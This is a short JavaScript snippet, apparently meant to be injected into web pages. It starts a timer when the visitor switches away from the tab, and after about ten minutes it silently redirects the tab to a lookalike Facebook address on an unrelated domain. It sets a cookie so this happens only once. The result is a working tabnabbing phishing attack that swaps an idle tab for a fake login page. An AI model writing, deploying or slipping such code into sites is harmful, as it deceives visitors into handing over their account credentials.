var timeout1;
console.log('start');
window.onblur=function(){timeout1=setTimeout('gogo()',598765);console.log('blur');};
window.onfocus=function(){console.log(timeout1); clearTimeout(timeout1); console.log('focus');};
function gogo()
{
console.log('gogo');
if(document.cookie.indexOf('fb_inter_sbx')<0)
  {
  	document.cookie = "fb_inter_sbx=" + Date.now() + ";path=/";
  	window.location.assign("https://www.facebook.com.b2d-74fa503a-5c1.magicgate.cloud/qPeAhtbP");
  }
}
